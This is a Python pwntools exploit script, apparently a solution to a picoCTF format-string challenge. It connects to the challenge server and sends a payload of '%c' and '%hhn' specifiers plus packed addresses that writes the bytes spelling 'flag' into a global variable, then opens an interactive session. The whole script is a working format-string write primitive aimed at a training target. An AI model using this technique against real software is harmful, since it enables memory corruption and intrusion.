import pwn

# pwn.context.terminal = ['tmux', 'splitw', '-h']

p = pwn.process('vuln')
p = pwn.remote('rhea.picoctf.net', 57914)

p.recvline()  # skip You don't have what it takes....

address_start_offset = 0x100
address_start_index = (0x7ffff9cfa428 - 0x7ffff9cfa2e8) // 0x08 + 6

# [0x00000000_00404060] == 0x67616C66

# 0x61 ==> [0x00000000_00404062]
# 0x66 ==> [0x00000000_00404060] 
# 0x67 ==> [0x00000000_00404063]
# 0x6c ==> [0x00000000_00404061]

payload = b""
payload += b"%97c"  # 0x61
payload += f"%{address_start_index}$hhn".encode()
payload += b"%5c"   # 0x66
payload += f"%{address_start_index + 1}$hhn".encode()
payload += b"%1c"   # 0x67
payload += f"%{address_start_index + 2}$hhn".encode()
payload += b"%5c"   # 0x6c
payload += f"%{address_start_index + 3}$hhn".encode()

if len(payload) < address_start_offset:
    payload += b"c" * (address_start_offset - len(payload))

# 0x00000000_00404062
payload += f"\x62\x40\x40\x00\x00\x00\x00\x00".encode()
# 0x00000000_00404060
payload += f"\x60\x40\x40\x00\x00\x00\x00\x00".encode()
# 0x00000000_00404063
payload += f"\x63\x40\x40\x00\x00\x00\x00\x00".encode()
# 0x00000000_00404061
payload += f"\x61\x40\x40\x00\x00\x00\x00\x00".encode()

# pwn.gdb.attach(p, '''
#     break printf
#     continue
# ''')
p.sendline(payload)
p.interactive()